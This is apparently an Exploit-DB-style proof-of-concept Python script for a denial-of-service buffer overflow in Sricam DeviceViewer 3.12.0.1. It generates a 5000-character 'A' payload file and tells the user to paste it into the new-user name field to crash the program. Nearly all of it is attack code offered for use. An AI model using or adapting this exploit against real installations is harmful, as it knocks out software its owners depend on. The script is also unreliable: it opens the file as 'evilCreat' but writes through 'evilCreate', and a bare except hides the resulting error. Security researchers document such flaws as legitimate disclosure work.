# Exploit Title: DeviceViewer 3.12.0.1 - 'creating user' DOS buffer overflow
# Date: 9/23/2019
# Exploit Author: Nu11pwn
# Vendor Homepage: http://www.sricam.com/
# Software Link: http://download.sricam.com/Manual/DeviceViewer.exe
# Version: v3.12.0.1
# Tested on: Windows 7 

payload = "A" * 5000

try:
    evilCreat =open("exploit.txt","w")
    print("""
    DeviceViewer 3.12.0.1 DOS exploit POC
    Author: Nu11pwn
    """)
    print("[x] Creating malicious file")
    evilCreate.write(payload)
    evilCreate.close()
    print("[x] Malicious file create")
    print("[x] When creating a new user, set the username to the file contents")
    print("[x] Watch the program crash")
except:
    print("[!] File failed to be created")
